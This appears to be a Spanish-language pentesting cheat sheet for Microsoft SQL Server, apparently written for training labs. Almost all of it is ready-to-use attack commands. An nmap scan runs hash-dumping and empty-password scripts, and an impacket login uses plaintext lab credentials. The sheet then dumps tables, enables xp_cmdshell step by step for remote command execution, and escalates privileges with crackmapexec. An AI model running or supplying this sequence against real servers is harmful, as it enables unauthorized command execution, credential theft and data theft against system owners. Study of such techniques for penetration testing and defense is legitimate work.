Usualmente usa los puertos tcp/1433 y UDP/1434

### Scan

    sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

### metasploit:

    scanner/mssql/mssql_ping

### connecting:

    impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

### Version

    SELECT @@version;

### Ver DBs:

    SELECT name FROM sys.databases;

### Ver tablas

    SELECT * FROM offsec.information_schema.tables;

### Dumpear una tabla

    select * from offsec.dbo.users;

---

# RCE

### 1)Iniciamos el advanced mode

    EXECUTE sp_configure 'show advanced options', 1;

### 2)Reconfiguramos

    RECONFIGURE;

### 3)Configuramos el xp_cmdshell

    EXECUTE sp_configure 'xp_cmdshell', 1;

### 4)Recondiguramos

    RECONFIGURE;
### 5) ejecutamos

    EXECUTE xp_cmdshell 'whoami';

# PE con crackmapexec

### Revisar si podemos elevar privilegios
    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
### Ejecutar de manera automática la elevación de privilegios

    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc

Luego vamos poder ejecutar comandos o hacer un rollback

### Hacer rollback de privilegios

    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
